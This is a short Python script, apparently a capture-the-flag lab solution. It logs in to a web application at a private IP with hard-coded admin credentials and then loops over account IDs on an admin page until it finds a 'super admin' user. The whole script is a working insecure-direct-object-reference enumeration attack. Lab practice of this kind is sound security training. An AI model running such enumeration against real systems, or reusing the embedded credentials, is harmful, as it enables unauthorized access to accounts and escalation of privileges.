import requests as req

with req.Session() as s:

    login = {
        "username": "admin",
        "password": "MEGACORP_4dm1n!!"
    }
    
    url = "http://10.10.10.28/cdn-cgi/login/"

    # Login to set cookies
    s.post(url, data=login)

    for id in range(1, 100):
        print(f"Testing with ID {id}...\r", end="")
        r = s.post(f"{url}admin.php?content=accounts&id={id}")

        #print(r.text)
        if "super" in r.text:
            print(f"\nFound super admin with ID: {id}")
            break